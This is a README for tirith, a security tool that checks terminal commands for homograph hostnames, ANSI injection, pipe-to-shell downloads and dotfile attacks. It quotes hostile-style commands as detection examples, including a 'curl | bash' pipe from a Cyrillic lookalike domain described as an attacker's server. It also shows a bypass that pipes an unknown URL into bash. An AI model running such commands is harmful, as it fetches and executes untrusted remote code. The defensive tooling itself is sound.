# tirith

**Your browser would catch this. Your terminal won't.**

[![CI](https://github.com/sheeki03/tirith/actions/workflows/ci.yml/badge.svg)](https://github.com/sheeki03/tirith/actions/workflows/ci.yml)
[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)

---

Can you spot the difference?

```
  curl -sSL https://install.example-cli.dev | bash     # safe
  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
```

You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.

Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.

**Tirith stands at the gate.**

```bash
brew install sheeki03/tap/tirith && eval "$(tirith init)"
```

That's it. Every command you run is now guarded. Zero friction on clean input. Sub-millisecond overhead. You forget it's there until it saves you.

Also available via [npm](#npm), [cargo](#cargo), [apt/dnf](#linux-packages), and [more](#install).

---

## See it work

**Homograph attack — blocked before execution:**

```
$ curl -sSL https://іnstall.example-clі.dev | bash

tirith: BLOCKED
  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
    This is a homograph attack. The URL visually mimics a legitimate
    domain but resolves to a completely different server.
  Bypass: prefix your command with TIRITH=0 (applies to that command only)
```

The command never executes.

**Pipe-to-shell with clean URL — warned, not blocked:**

```
$ curl -fsSL https://get.docker.com | sh

tirith: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
    Consider downloading first and reviewing.
```

Warning prints to stderr. Command still runs.

**Normal commands — invisible:**

```
$ git status
$ ls -la
$ docker compose up -d
```

Nothing. Zero output. You forget tirith is running.

---

## What it catches

**30 rules across 7 categories.** All analysis is local. No network calls.

| Category | What it stops |
|----------|--------------|
| **Homograph attacks** | Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels |
| **Terminal injection** | ANSI escape sequences that rewrite your display, bidi overrides that reverse text, zero-width characters that hide in domains |
| **Pipe-to-shell** | `curl \| bash`, `wget \| sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern |
| **Dotfile attacks** | Downloads targeting `~/.bashrc`, `~/.ssh/authorized_keys`, `~/.gitconfig` — blocked, not just warned |
| **Insecure transport** | Plain HTTP piped to shell, `curl -k`, disabled TLS verification |
| **Ecosystem threats** | Git clone typosquats, untrusted Docker registries, pip/npm URL installs |
| **Credential exposure** | `http://user:pass@host` userinfo tricks, shortened URLs hiding destinations |

---

## Install

### macOS

**Homebrew:**

```bash
brew install sheeki03/tap/tirith
```

### Linux Packages

**Debian / Ubuntu (.deb):**

Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:

```bash
sudo dpkg -i tirith_*_amd64.deb
```

**Fedora / RHEL / CentOS 9+ (.rpm):**

Download from [GitHub Releases](https://github.com/sheeki03/tirith/releases/latest), then:

```bash
sudo dnf install ./tirith-*.rpm
```

**Arch Linux (AUR):**

```bash
yay -S tirith
# or: paru -S tirith
```

**Nix:**

```bash
nix profile install github:sheeki03/tirith
# or try without installing: nix run github:sheeki03/tirith -- --version
```

### Windows

**Scoop:**

```powershell
scoop bucket add tirith https://github.com/sheeki03/scoop-tirith
scoop install tirith
```

**Chocolatey:**

```powershell
choco install tirith
```

### Cross-Platform

**npm:**

```bash
npm install -g tirith
```

**Cargo:**

```bash
cargo install tirith
```

**asdf:**

```bash
asdf plugin add tirith https://github.com/sheeki03/asdf-tirith.git
asdf install tirith latest
asdf global tirith latest
```

**Docker:**

```bash
docker run --rm ghcr.io/sheeki03/tirith check -- "curl https://example.com | bash"
```

### Activate

Add to your shell profile (`.zshrc`, `.bashrc`, or `config.fish`):

```bash
eval "$(tirith init)"
```

| Shell | Hook type | Tested on |
|-------|-----------|-----------|
| zsh | preexec + paste widget | 5.8+ |
| bash | preexec (two modes) | 5.0+ |
| fish | fish_preexec event | 3.5+ |
| PowerShell | PSReadLine handler | 7.0+ |

### Shell Integrations

**Oh-My-Zsh:**

```bash
git clone https://github.com/sheeki03/ohmyzsh-tirith \
  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/tirith

# Add tirith to plugins in ~/.zshrc:
plugins=(... tirith)
```

---

## Commands

### `tirith check -- <cmd>`
Analyze a command without executing it. Useful for testing what tirith would flag.

```bash
$ tirith check -- curl -sSL https://іnstall.example-clі.dev \| bash
tirith: BLOCKED
  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
```

### `tirith paste`
Reads from stdin and analyzes pasted content. The shell hook calls this automatically when you paste into the terminal — you don't need to run it manually.

### `tirith score <url>`
Breaks down a URL's trust signals — TLS, domain age heuristics, known shorteners, Unicode analysis.

```bash
$ tirith score https://bit.ly/something
```

### `tirith diff <url>`
Byte-level comparison showing exactly where suspicious characters are hiding.

```
$ tirith diff https://exаmple.com
  Position 3: expected 0x61 (Latin a) | got 0xd0 0xb0 (Cyrillic а)
```

### `tirith run <url>`
Safe replacement for `curl | bash`. Downloads to a temp file, shows SHA256, runs static analysis, opens in a pager for review, and executes only after you confirm. Creates a receipt you can verify later.

```bash
$ tirith run https://get.docker.com
```

### `tirith receipt {last,list,verify}`
Track and verify scripts you've run through `tirith run`. Each execution creates a receipt with the script's SHA256 hash so you can audit what ran on your machine.

```bash
$ tirith receipt last        # show the most recent receipt
$ tirith receipt list        # list all receipts
$ tirith receipt verify <sha256>  # verify a specific receipt
```

### `tirith why`
Explains the last rule that triggered — what it detected, why it matters, and what to do about it.

### `tirith init`
Prints the shell hook for your current shell. Add `eval "$(tirith init)"` to your shell profile to activate tirith.

### `tirith doctor`
Diagnostic check — shows detected shell, hook status, policy file location, and configuration. Run this if something isn't working.

---

## What tirith never does

- **No network calls** during `check` or `paste` — all analysis is local
- **No command rewriting** — tirith never modifies what you typed
- **No telemetry** — nothing leaves your machine, ever
- **No background processes** — invoked per-command, exits immediately
- **No cloud dependency** — works offline, no accounts, no API keys

---

## Configuration

Tirith uses a YAML policy file. Discovery order:
1. `.tirith/policy.yaml` in current directory (walks up to repo root)
2. `~/.config/tirith/policy.yaml`

```yaml
version: 1
allowlist:
  - "get.docker.com"
  - "sh.rustup.rs"

severity_overrides:
  docker_untrusted_registry: critical

fail_mode: open  # or "closed" for strict environments
```

More examples in [docs/cookbook.md](docs/cookbook.md).

**Bypass** for the rare case you know exactly what you're doing:

```bash
TIRITH=0 curl -L https://something.xyz | bash
```

This is a standard shell per-command prefix — the variable only exists for that single command and does not persist in your session. Organizations can disable this entirely: `allow_bypass: false` in policy.

---

## Data handling

Local JSONL audit log at `~/.local/share/tirith/log.jsonl`:
- Timestamp, action, rule ID, redacted command preview
- **No** full commands, environment variables, or file contents

Disable: `export TIRITH_LOG=0`

---

## Docs

- [Threat model](docs/threat-model.md) — what tirith defends against and what it doesn't
- [Cookbook](docs/cookbook.md) — policy examples for common setups
- [Troubleshooting](docs/troubleshooting.md) — shell quirks, latency, false positives
- [Compatibility](docs/compatibility.md) — stable vs experimental surface
- [Security policy](SECURITY.md) — vulnerability reporting
- [Uninstall](docs/uninstall.md) — clean removal per shell and package manager

## License

tirith is dual-licensed:

- **AGPL-3.0-only**: [LICENSE-AGPL](LICENSE-AGPL) — free under copyleft terms
- **Commercial**: [LICENSE-COMMERCIAL](LICENSE-COMMERCIAL) — alternative licensing available

This software is free under AGPL-3.0-only with copyleft obligations. If your intended
use would trigger AGPL requirements and you prefer not to comply, contact
sheeki003@gmail.com for commercial licensing options.

Third-party data attributions in [NOTICE](NOTICE).
